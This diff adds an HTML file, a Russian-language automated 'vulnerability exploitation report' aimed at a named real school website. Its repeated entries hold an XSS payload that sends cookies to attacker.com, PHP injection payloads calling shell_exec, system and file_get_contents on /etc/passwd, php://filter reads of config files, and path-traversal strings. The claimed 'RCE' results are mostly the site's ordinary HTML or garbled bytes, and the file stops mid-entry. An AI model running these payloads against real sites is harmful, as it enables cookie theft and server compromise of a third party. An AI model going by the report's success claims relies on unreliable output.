@@ -1,0 +1,1843 @@
+
+    <!DOCTYPE html>
+    <html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Отчет об эксплуатации уязвимостей</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; color: #333; line-height: 1.6; }
+            .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+            h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
+            h2 { color: #2c3e50; margin-top: 30px; }
+            h3 { color: #2c3e50; }
+            .vulnerability { background: #f9f9f9; border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 4px; }
+            .vuln-details { margin-left: 20px; }
+            .payload { background: #ecf0f1; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; }
+            .extracted-data { background: #ecf0f1; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; max-height: 200px; overflow-y: auto; }
+            .admin-panel { background: #f9f9f9; border-left: 4px solid #f39c12; padding: 15px; margin: 15px 0; border-radius: 4px; }
+            .admin-compromised { border-left: 4px solid #e74c3c; }
+            .stats { background: #f9f9f9; border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 4px; }
+            .footer { margin-top: 30px; font-size: 0.8em; color: #7f8c8d; text-align: center; }
+            .credentials { background: #e74c3c; color: white; padding: 5px 8px; border-radius: 4px; font-family: monospace; }
+            .method { display: inline-block; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
+            .get { background: #3498db; color: white; }
+            .post { background: #2ecc71; color: white; }
+            .rec-box { background: #fff8e1; border-left: 4px solid #ffc107; padding: 10px; margin: 10px 0; border-radius: 4px; }
+            .technique-box { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 10px; margin: 10px 0; border-radius: 4px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🔍 ДЕТАЛЬНЫЙ ОТЧЕТ ОБ ЭКСПЛУАТАЦИИ УЯЗВИМОСТЕЙ</h1>
+    
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #1</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=oJISI2gx&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> oJISI2gx</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #2</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=NP9pdam8&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> NP9pdam8</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #3</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=kCt2Om4p&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> kCt2Om4p</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #4</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=US0Bp9s9&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> US0Bp9s9</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #5</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=hhvy9oir&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> hhvy9oir</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #6</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=p34ewGPN&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> p34ewGPN</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #1</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;?php echo "RCE_TEST"; ?&gt;</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">RCE_TEST</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #2</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;?php echo file_get_contents("/etc/passwd"); ?&gt;</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;html</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #3</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;?php echo shell_exec("id"); ?&gt;</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;html</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #4</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;?php echo system("ls -la"); ?&gt;</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;html</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #5</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;?php echo phpinfo(); ?&gt;</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;html</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #6</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">php://filter/convert.base64-encode/resource=../config/database.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> filter_wrappers</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Использование PHP filter wrapper для чтения исходного кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">jכjڞw</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #7</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">php://filter/convert.base64-encode/resource=../wp-config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> filter_wrappers</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Использование PHP filter wrapper для чтения исходного кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">jכjڞw</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #8</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">php://filter/convert.base64-encode/resource=../config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> filter_wrappers</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Использование PHP filter wrapper для чтения исходного кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">jכjڞw</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #9</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">php://filter/convert.base64-encode/resource=../configuration.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> filter_wrappers</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Использование PHP filter wrapper для чтения исходного кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">jכjڞw</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #10</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">php://filter/convert.base64-encode/resource=../includes/config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> filter_wrappers</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Использование PHP filter wrapper для чтения исходного кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">jכjڞw</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #11</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../etc/passwd</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #12</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../etc/hosts</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #13</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/index.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #14</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #15</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/wp-config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
